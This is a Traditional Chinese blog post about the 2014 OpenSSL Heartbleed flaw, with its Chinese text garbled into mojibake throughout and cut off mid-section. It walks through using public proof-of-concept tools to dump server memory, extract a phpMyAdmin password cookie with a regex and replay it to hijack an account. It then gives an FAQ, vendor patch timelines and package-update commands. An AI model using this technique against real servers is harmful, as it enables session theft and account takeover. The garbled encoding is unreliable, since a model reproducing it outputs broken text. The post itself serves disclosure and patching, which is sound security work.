&lt;p&gt;å¤§å®¶éƒ½èªª OpenSSL Heartbleed æ¼æ´å¯æœ›ç‚ºæœ¬å¹´åº¦æœ€åš´é‡çš„æ¼æ´ï¼Œåˆ°åº•æœ‰å¤šåš´é‡å‘¢ï¼Ÿæˆ‘ç›¸ä¿¡æ²’æœ‰çœ‹åˆ°æ”»æ“Šçš„ç¯„ä¾‹æ˜¯æ²’æœ‰æ„Ÿè¦ºçš„ã€‚å¤§å®¶å¯ä»¥å…ˆçœ‹çœ‹ä»¥ä¸‹çš„å½±ç‰‡ï¼Œåˆ©ç”¨æœ€å…ˆé‡‹å‡ºçš„å…©å€‹ç°¡å–®çš„ PoC exploit ï¼ˆå¼±é»åˆ©ç”¨ç¨‹å¼ï¼‰ã€Œssltest.pyã€ä»¥åŠã€Œcheck-ssl-heartbleed.plã€ï¼Œä¾†æª¢æ¸¬ä¼ºæœå™¨æ˜¯å¦æœ‰ Heartbleed å•é¡Œã€‚æª¢æ¸¬çš„åŒæ™‚å¯ä»¥ç²å–ä¼ºæœå™¨è¨˜æ†¶é«”ä¸­çš„è³‡è¨Šï¼Œå…¶ä¸­å°±å¯èƒ½åŒ…å«äº†æ©Ÿæ•è³‡è¨Šã€‚&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘ä¾†çœ‹çœ‹å§ï¼&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/kFGzu0-cIxE&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;é¦–å…ˆåˆ©ç”¨ &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;ssltest.py&lt;/a&gt; ä¾†æ¸¬è©¦ï¼Œä¾†çœ‹ä¼ºæœå™¨æ˜¯å¦æœ‰è¢« heartbleed æ¼æ´å½±éŸ¿ï¼Œfbi.gov åœ¨ç¬¬ä¸‰å¤©å·²ç¶“ä¿®å¾©é€™å€‹å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;åˆ©ç”¨ ssltest.py ä¾†æ¸¬è©¦ä¼ºæœå™¨æ˜¯å¦æœ‰ Heartbleed æ¼æ´ã€‚&quot; title=&quot;åˆ©ç”¨ ssltest.py ä¾†æ¸¬è©¦ä¼ºæœå™¨æ˜¯å¦æœ‰ Heartbleed æ¼æ´ã€‚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœæ˜¯æª¢æ¸¬ä¸€å€‹æœ‰æ¼æ´çš„ç¶²ç«™ï¼Œé€™å€‹å·¥å…·æœƒç›´æ¥æŠŠè¨˜æ†¶é«”çš„å…§å®¹é¡¯ç¤ºå‡ºä¾†ï¼Œå…¶ä¸­å¯èƒ½åŒ…æ‹¬ http å‚³è¼¸çš„è³‡æ–™ã€å¸³è™Ÿå¯†ç¢¼ã€ç§å¯†é‡‘é‘°ç­‰ã€‚åœ¨é€™å€‹ä¾‹å­ä¸­ï¼Œæ”»æ“Šç¨‹å¼è®€å–åˆ°ä½¿ç”¨è€…é€å‡ºçš„ formï¼Œè‹¥å…¶ä¸­åŒ…å«å€‹è³‡å°‡æœƒè¢«ä¸€è¦½ç„¡éºï¼Œéå¸¸å±éšªã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;åˆ©ç”¨ ssltest.py æŠ“å‡ºè¨˜æ†¶é«”ä¸­çš„è³‡æ–™ï¼Œå…¶ä¸­åŒ…æ‹¬ HTTP å‚³è¼¸å…§å®¹ã€‚&quot; title=&quot;åˆ©ç”¨ ssltest.py æŠ“å‡ºè¨˜æ†¶é«”ä¸­çš„è³‡æ–™ï¼Œå…¶ä¸­åŒ…æ‹¬ HTTP å‚³è¼¸å…§å®¹ã€‚&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦ä¸€å€‹å·¥å…· &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;check-ssl-heartbleed.pl&lt;/a&gt; å¯ä»¥ä½¿ç”¨ -R åƒæ•¸åšæ›´æœ‰æ•ˆçš„åˆ©ç”¨ã€‚ç›´æ¥åŸ·è¡ŒæŒ‡ä»¤å¯ä»¥å¿«é€Ÿé¡¯ç¤ºä¼ºæœå™¨æœ‰ç„¡å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl ä¾†æª¢æŸ¥ä¼ºæœå™¨æ˜¯å¦æœ‰ heartbleed å•é¡Œã€‚&quot; title=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl ä¾†æª¢æŸ¥ä¼ºæœå™¨æ˜¯å¦æœ‰ heartbleed å•é¡Œã€‚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœä½¿ç”¨ã€Œ-Rã€åƒæ•¸ä¸¦ä¸”æŒ‡å®šç‰¹å®šçš„æ­£è¦è¡¨ç¤ºå¼ï¼Œå¯ä»¥æŠ“å‡ºæƒ³è¦ç²å–çš„è³‡æ–™ã€‚ä¾‹å¦‚ Cookieã€å¸³è™Ÿå¯†ç¢¼ç­‰ã€‚ä»¥æ­¤ä¾‹ï¼Œæˆ‘å€‘çŸ¥é“é€™å€‹ç¶²ç«™æä¾› &lt;a href=&quot;http://www.phpmyadmin.net&quot;&gt;phpMyAdmin&lt;/a&gt; å¥—ä»¶ï¼Œå› æ­¤ç›´æ¥é–å®šã€ŒpmaPassã€è³‡æ–™ä¾†æŠ“å–ï¼Œæ²’æƒ³åˆ°ç¬¬ä¸€æ¬¡å°±æŠ“åˆ°äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl æŠ“å‡ºç‰¹å®šæ©Ÿæ•è³‡æ–™ã€‚&quot; title=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl æŠ“å‡ºç‰¹å®šæ©Ÿæ•è³‡æ–™ã€‚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—æ”»æ“Šè€…åªè¦æŠŠé€™å€‹ç²å–åˆ°çš„ Cookie å­˜å…¥è‡ªå·±çš„ç€è¦½å™¨ä¸­ï¼Œå°±å¯ä»¥å¦‚å½±ç‰‡ä¸­ç›œç”¨é€™å€‹å¸³è™Ÿã€‚æ˜¯å¦å¾ˆå±éšªå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;é™¤äº†é€™ç¨®åˆ©ç”¨æ–¹æ³•ä¹‹å¤–ï¼Œé‚„æœ‰æ›´å¤šæƒ…æ³æ˜¯ç›´æ¥æŠŠä½¿ç”¨è€…ç™»å…¥çš„å¸³è™Ÿå¯†ç¢¼ç›´æ¥é¡¯ç¤ºå‡ºä¾†çš„ï¼Œå› æ­¤å¦‚æœä¼ºæœå™¨æ²’æœ‰åšå¥½é˜²ç¦¦æˆ–æ›´æ–°ï¼Œæ•´å€‹ç¶²ç«™çš„ä½¿ç”¨è€…è³‡æ–™éƒ½å¯ä»¥å› æ­¤å¤–æ´©ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘ä¸€ç›´å¼·èª¿ä¼ºæœå™¨ç®¡ç†è€…å¿…é ˆè¦æ›´æ–°é‡‘é‘°ã€å…¨ç«™ä½¿ç”¨è€…å¸³è™Ÿå¯†ç¢¼ç­‰ï¼Œä»¥é˜²æœ‰å¿ƒäººå£«å€Ÿæ­¤æ’ˆå–è³‡æ–™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;èª°åœ¨åˆ©ç”¨-heartbleed-æ¼æ´ç«Šå–è³‡æ–™å‘¢&quot;&gt;èª°åœ¨åˆ©ç”¨ Heartbleed æ¼æ´ç«Šå–è³‡æ–™å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç”± github ä¸Šé¢çš„ &lt;a href=&quot;https://github.com/openssl/openssl/commit/4817504d069b4c5082161b02a22116ad75f822b1&quot;&gt;commit è¨˜éŒ„&lt;/a&gt;ï¼Œå‡ºå•é¡Œçš„é‚£è¡Œç¨‹å¼ç¢¼æ˜¯åœ¨ 2011-12-31 22:59:57 commit çš„ï¼Œä¸çŸ¥é“æ˜¯é–‹ç™¼è€…å¤ªç´¯é‚„æ˜¯ NSA çš„é™°è¬€ã€‚æ ¹æ“š Bloomberg çš„&lt;a href=&quot;http://www.bloomberg.com/news/2014-04-11/nsa-said-to-have-used-heartbleed-bug-exposing-consumers.html&quot;&gt;å ±å°&lt;/a&gt;æŒ‡å‡ºï¼ŒçŸ¥æƒ…äººå£«è¡¨ç¤º NSA æ—©åœ¨&lt;strong&gt;å…©å¹´å‰&lt;/strong&gt;å°±å·²ç¶“çŸ¥é“æ­¤æ¼æ´ï¼Œä¸¦ä¸”&lt;strong&gt;åˆ©ç”¨é€™å€‹æ¼æ´ç«Šå–è¨±å¤šç¶²ç«™çš„æ©Ÿæ•è³‡æ–™&lt;/strong&gt;ã€‚é€™ä»£è¡¨ NSA åœ¨ä¸€é–‹å§‹å°±çŸ¥é“é€™å€‹æ¼æ´ï¼Œä»¤äººä¸ç¦æœ‰å…¶ä»–è¯æƒ³ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The U.S. National Security Agency knew for at least two years about a flaw in the way that many websites send sensitive information, now dubbed the Heartbleed bug, and regularly used it to gather critical intelligence, two people familiar with the matter said.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨ä¹‹å‰&lt;a href=&quot;http://hitcon.org&quot;&gt;å°ç£é§­å®¢å¹´æœƒ (HITCON)&lt;/a&gt; 2013 çš„è¬›å¸« Rahul Sasi (Garage4Hackers) å…¬å¸ƒäº†&lt;a href=&quot;https://bitbucket.org/fb1h2s/cve-2014-0160/src/bba16b3eedef0e92bd91fea496b00c92eb515e29/Heartbeat_scanner.py?at=master&quot;&gt;å¤§é‡æƒæ Heartbleed æ¼æ´çš„ç¨‹å¼&lt;/a&gt;ï¼Œä¹Ÿå¯ä»¥ä¾›ç ”ç©¶äººå“¡è‡ªè¡Œç ”ç©¶ï¼Œæˆ–è€…æ˜¯å°‹æ‰¾è‡ªå·±ç®¡ç†çš„ä¸»æ©Ÿä¸­æœ‰å¤šå°‘åŒ…å«é€™å€‹é¢¨éšªçš„ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¸¸è¦‹å•é¡Œ&quot;&gt;å¸¸è¦‹å•é¡Œ&lt;/h3&gt;

&lt;h3 id=&quot;openssl-æ˜¯ä»€éº¼iis-æœƒå—-heartbleed-æ¼æ´å½±éŸ¿å—&quot;&gt;OpenSSL æ˜¯ä»€éº¼ï¼ŸIIS æœƒå— Heartbleed æ¼æ´å½±éŸ¿å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.openssl.org&quot;&gt;OpenSSL&lt;/a&gt; æ˜¯ä¸€å€‹å‡½å¼åº«ï¼ˆLibraryï¼‰ï¼Œåœ¨ UNIX ç³»åˆ—çš„æœå‹™è‹¥æœ‰ä½¿ç”¨ SSLï¼Œé€šå¸¸éƒ½æœƒä½¿ç”¨ OpenSSLã€‚å› æ­¤é€™æ¬¡çš„æ¼æ´ä¸¦æœªå½±éŸ¿å¾®è»Ÿ IISã€‚&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘ä½¿ç”¨-openssl-098å¤ªå¥½äº†æˆ‘ç”¨èˆŠç‰ˆæˆ‘å¥½å®‰å…¨&quot;&gt;æˆ‘ä½¿ç”¨ OpenSSL 0.9.8ï¼Œå¤ªå¥½äº†æˆ‘ç”¨èˆŠç‰ˆæˆ‘å¥½å®‰å…¨ï¼&lt;/h3&gt;

&lt;p&gt;ä½ è½é &lt;a href=&quot;http://en.wikipedia.org/wiki/Transport_Layer_Security#BEAST_attack&quot;&gt;BEAST&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/BREACH_%28security_exploit%29&quot;&gt;BREACH&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/CRIME_%28security_exploit%29&quot;&gt;CRIME&lt;/a&gt;, &lt;a href=&quot;http://www.isg.rhul.ac.uk/tls/Lucky13.html&quot;&gt;Lucky 13&lt;/a&gt; å—ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘æ²’æœ‰ä½¿ç”¨-httpsæ‰€ä»¥æˆ‘å¾ˆå®‰å…¨&quot;&gt;æˆ‘æ²’æœ‰ä½¿ç”¨ HTTPSï¼Œæ‰€ä»¥æˆ‘å¾ˆå®‰å…¨ï¼&lt;/h3&gt;

&lt;p&gt;ã€‚ã€‚ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åªæœ‰ç¶²é ä¼ºæœå™¨http-serveræœƒå—å½±éŸ¿å—&quot;&gt;åªæœ‰ç¶²é ä¼ºæœå™¨ï¼ˆHTTP Serverï¼‰æœƒå—å½±éŸ¿å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ä¸åªï¼åªè¦ä½¿ç”¨ OpenSSL æ”¯æ´ STARTTLS çš„æœå‹™éƒ½åœ¨å½±éŸ¿ç¯„åœï¼ŒåŒ…æ‹¬ HTTPSã€IMAPSã€POPSã€SMTPS ç­‰ä¼ºæœå™¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åªæœ‰è‡ªå·±æ¶è¨­çš„ä¼ºæœå™¨æœƒå—å½±éŸ¿å—&quot;&gt;åªæœ‰è‡ªå·±æ¶è¨­çš„ä¼ºæœå™¨æœƒå—å½±éŸ¿å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç•¶ç„¶ä¸åªï¼ç›®å‰å·²ç¶“å‡ºç¾å„å¤§è¨­å‚™å» å•†éƒ½é­é‡åˆ°é€™æ¨£çš„å•é¡Œã€‚å„å¤§è¨­å‚™å» å•†ã€ä½œæ¥­ç³»çµ±ç­‰å½±éŸ¿ç‹€æ³ï¼Œå¯ä»¥åƒé–±ä»¥ä¸‹æ–‡ç« ã€‚&lt;/p&gt;

&lt;p&gt;CERT: OpenSSL heartbeat extension read overflow discloses sensitive information
&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&quot;&gt;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å» å•†çš„è¨­å‚™ç›®å‰ç‹€æ³ç‰¹åˆ¥åš´é‡ï¼Œå› ç‚ºæ‰€æœ‰åŒå€‹ç‰ˆæœ¬çš„è¨­å‚™éƒ½æœƒå—å½±éŸ¿ï¼Œè€Œåœ¨å» å•†é‡‹å‡ºæ›´æ–°ä¹‹å‰ï¼Œåªèƒ½è¢«å‹•çš„ç­‰å¾…æ›´æ–°ã€‚è‹¥æ²’æœ‰ç¹¼çºŒç°½è¨‚ç¶­è­·ç´„çš„è¨­å‚™ï¼Œä¹Ÿåªèƒ½ç¹¼çºŒè·Ÿå» å•†ç°½ç´„æ›´æ–°ï¼Œæˆ–è€…æ˜¯çœ‹å» å•†æ˜¯å¦å¯ä»¥ç›´æ¥æä¾›æ›´æ–°æª”ã€‚å¦‚æœæœ‰ VPN Server ç­‰æœå‹™æ›´è¦æ³¨æ„ï¼Œå¦‚æœè¢«æ”»æ“Šè€…å–å¾—å¸³è™Ÿå¯†ç¢¼ï¼Œç­‰æ–¼å¦‚å…¥ç„¡äººä¹‹å¢ƒï¼Œç›´æ¥ä½¿ç”¨ä½ çš„å¸³è™Ÿç™»å…¥åˆ°ä¼æ¥­å…§ç¶²ï¼Œä¸å¯ä¸æ…ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å„å®¶ç³»çµ±æ›´æ–°çš„é€Ÿåº¦&quot;&gt;å„å®¶ç³»çµ±æ›´æ–°çš„é€Ÿåº¦ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;å¼•è¿°è‡ªå¥½æœ‹å‹ Ant çš„&lt;a href=&quot;http://blog.gcos.me/2014-04-10_openssl-cve-2014-0160-security-issue.html&quot;&gt;æ–‡ç« &lt;/a&gt;ï¼Œå„å®¶ä½œæ¥­ç³»çµ±ã€ç¶²ç«™çš„æ›´æ–°é€Ÿåº¦ï¼Œä»£è¡¨è‘—ä¼æ¥­é‡è¦–è³‡å®‰çš„ç¨‹åº¦ä»¥åŠé‡å°è³‡å®‰äº‹ä»¶ç·Šæ€¥æ‡‰è®Šçš„æ•ˆç‡ï¼Œä¹Ÿå¯ä»¥ä½œç‚ºæˆ‘å€‘æŒ‘é¸ç³»çµ±ã€ç¶²ç«™ã€å» å•†çš„ä¾æ“šã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;äºŒã€ä½œæ¥­ç³»çµ±çš„æ›´æ–°é€²åº¦&lt;/p&gt;

  &lt;p&gt;å¾è³‡å®‰äº‹ä»¶çš„è™•ç†å¯ä»¥æ¨æ•²å‡ºå„ä½œæ¥­ç³»çµ±å•†å°æ–¼ç·Šæ€¥äº‹ä»¶çš„åæ‡‰é€Ÿåº¦ã€‚
æ™‚é–“è»¸ï¼ŒæŒ‰ç…§ä¿®å¾©çš„å…ˆå¾Œæ’åˆ—ï¼š&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;OpenSSL (è³‡å®‰å¼±é»çš„ä¸»è§’) ç¬¬ä¸€æ¬¡å…¬é–‹æ­éœ²çš„æ™‚é–“ç´„åœ¨ 2014å¹´4æœˆ6æ—¥ 0æ™‚ã€‚&lt;/li&gt;
    &lt;li&gt;RedHat åœ¨ 2014å¹´4æœˆ7æ—¥ 07:47:00 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;OpenSSL æ­£å¼ç¢ºèªä¸¦ä¿®å¾©çš„æ™‚é–“ç´„åœ¨ 2014å¹´4æœˆ7æ—¥16æ™‚ã€‚&lt;/li&gt;
    &lt;li&gt;OpenBSD ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 20:17 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Arch Linux ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 20:36 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Debian ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 21:45 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;FreeBSD ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 21:46 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Ubuntu ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 21:48 æ­£å¼ä¿®å¾©ã€‚
(2014å¹´4æœˆ8æ—¥åˆ†éš”å€)&lt;/li&gt;
    &lt;li&gt;Fedora ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 00:33 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;CentOS ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 02:49 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;OpenSUSE ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 05:32 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Scentific ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 08:27 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Gentoo ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 09:36 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;é‡é»æ•´ç†ï¼š&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;RedHat ä¿®å¾©çš„é€Ÿåº¦æ¯” OpenSSL å®˜æ–¹é‚„å¿«ã€‚&lt;/li&gt;
    &lt;li&gt;RedHat æ´¾ç³»çš„ä¿®å¾©æ™‚é–“ï¼Œé™¤äº† RedHat å¤–éƒ½ç®—æ…¢ï¼Œå¦‚ Fedora åŠ CentOSã€Scentificï¼Œä»–å€‘éƒ½æ¯” RedHat æ…¢ 16 å°æ™‚ä»¥ä¸Šã€‚&lt;/li&gt;
    &lt;li&gt;Debian æ´¾ç³»çš„ä¿®å¾©æ™‚é–“ï¼Œå¦‚ Debian åŠ Ubuntuï¼Œéƒ½æ¯” RedHat æ…¢ä¸Šè‡³å°‘ 12 å°æ™‚ä»¥ä¸Šã€‚&lt;/li&gt;
    &lt;li&gt;Gentoo æ˜¯åˆ—è¡¨ä¸­ä¿®å¾©æœ€æ…¢çš„ã€‚&lt;/li&gt;
    &lt;li&gt;è‹¥ä»¥è³‡å®‰é»ƒé‡‘ 6 å°æ™‚ä¾†èªªï¼ŒFedoraã€CentOSã€OpenSUSEã€Scentific åŠ Gentoo éƒ½ä¸åŠæ ¼ã€‚&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;ä¸‰ã€å¤§å…¬å¸æ›´æ–°çš„é€Ÿåº¦&lt;/p&gt;

  &lt;p&gt;åŒæ¨£åœ°ï¼Œå¾è³‡å®‰äº‹ä»¶çš„è™•ç†å¯ä»¥æ¨æ•²å‡ºå„å…¬å¸å°æ–¼ç·Šæ€¥äº‹ä»¶çš„åæ‡‰é€Ÿåº¦ã€‚&lt;/p&gt;

  &lt;p&gt;é›²ç«¯ç›¸é—œå…¬å¸&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Cloudflare ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 11æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;DigitalOcean ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 12æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;AWS ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 12æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Linode ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 14æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Heroku ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 16æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
  &lt;/ul&gt;

  &lt;p&gt;æœ‰äº›å…¬å¸ç›´åˆ° 2014å¹´4æœˆ8æ—¥ 16æ™‚éƒ½é‚„æ²’ä¿®å¾©ã€‚æ­¤æ™‚å·²é›¢å®˜æ–¹æ­£å¼ä¿®å¾©æ•´æ•´ä¸€å¤©ï¼Œä¹Ÿæ¯”ä¸Šè¿°æ©Ÿå™¨æ•¸å¾ˆå¤šçš„é›²ç«¯ç›¸é—œå…¬å¸é‚„æ…¢ã€‚é€™äº›å…¬å¸ç‚ºï¼Œ&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Yahoo.com / Flickr.com&lt;/li&gt;
    &lt;li&gt;Kaspersky.com (è³‡å®‰å…¬å¸)&lt;/li&gt;
    &lt;li&gt;stackoverflow.com&lt;/li&gt;
    &lt;li&gt;stackexchange .com&lt;/li&gt;
    &lt;li&gt;php.net&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ„Ÿè¬ StackNG çš„è£œå……ï¼šCloudflare æ–¼ 2014 å¹´ 4 æœˆ 7 æ—¥ 11 æ™‚å…¬å‘Šï¼Œä½†åœ¨æ¼æ´å…¬å‘Šä¹‹å‰å·²ç¶“ä¿®å¾©ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç›®å‰é‚„æœ‰å“ªäº›ä¼ºæœå™¨æœ‰å•é¡Œå‘¢&quot;&gt;ç›®å‰é‚„æœ‰å“ªäº›ä¼ºæœå™¨æœ‰å•é¡Œå‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æ ¹æ“š &lt;a href=&quot;https://zmap.io/&quot;&gt;ZMap&lt;/a&gt; çš„&lt;a href=&quot;https://zmap.io/heartbleed/&quot;&gt;ç ”ç©¶å ±å‘Š&lt;/a&gt;æŒ‡å‡ºï¼Œä»–å€‘é‡å° &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa å‰ä¸€ç™¾è¬å€‹ç¶²ç«™&lt;/a&gt;é€²è¡Œæª¢æ¸¬ï¼Œå¤§ç´„æœ‰ 36% çš„ä¼ºæœå™¨æ”¯æ´ TLSã€7.6% çš„ä¼ºæœå™¨å«æœ‰æ­¤æ¼æ´ã€‚ZMap ä¸¦æä¾›äº†ä¸€å€‹&lt;a href=&quot;https://zmap.io/heartbleed/vulnerable.html&quot;&gt;å®Œæ•´çš„æ¸…å–®&lt;/a&gt;åˆ—å‡ºåœ¨ 2014/4/11 17:00 å°šæœªä¿®å¾©æ¼æ´çš„ç¶²ç«™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;æœ‰ä»€éº¼å€¼å¾—æ¸¬è©¦çš„ç¶²ç«™å‘¢&quot;&gt;æœ‰ä»€éº¼å€¼å¾—æ¸¬è©¦çš„ç¶²ç«™å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;via &lt;a href=&quot;https://www.facebook.com/photo.php?fbid=10201756684385494&quot;&gt;Facebook&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘è¦æ€éº¼æ›´æ–°-openssl-å‘¢&quot;&gt;æˆ‘è¦æ€éº¼æ›´æ–° OpenSSL å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æ ¹æ“šä¸åŒçš„ Linux Distribution æœ‰ä¸åŒçš„æ›´æ–°æ–¹å¼ï¼Œè‹¥æœ‰è‡ªå·±å®¢è£½åŒ–ä¸€äº›ç¨‹å¼è¨­å®šï¼Œå¯èƒ½å°±éœ€è¦è‡ªè¡Œæ›´æ–°ã€‚ä»¥ä¸‹æˆ‘å€‘ç°¡å–®ä»‹ç´¹æ›´æ–°æ­¥é©Ÿï¼š&lt;/p&gt;

&lt;p&gt;RedHat / CentOS / Fedora ç³»åˆ—æ›´æ–°å¥—ä»¶ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yum update
yum update openssl #åªæ›´æ–° OpenSSL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Debian / Ubuntu ç³»åˆ—æ›´æ–°å¥—ä»¶ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get update
sudo apt-get dist-upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è‹¥åªè¦æ›´æ–° OpenSSL å‰‡å¯ä»¥åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install --only-upgrade openssl
sudo apt-get install --only-upgrade libssl1.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ³¨æ„ OpenSSL æ˜¯å¦å·²ç¶“æ›´æ–°ç‚ºä¿®å¾©çš„ç‰ˆæœ¬ï¼š&lt;/p&gt;

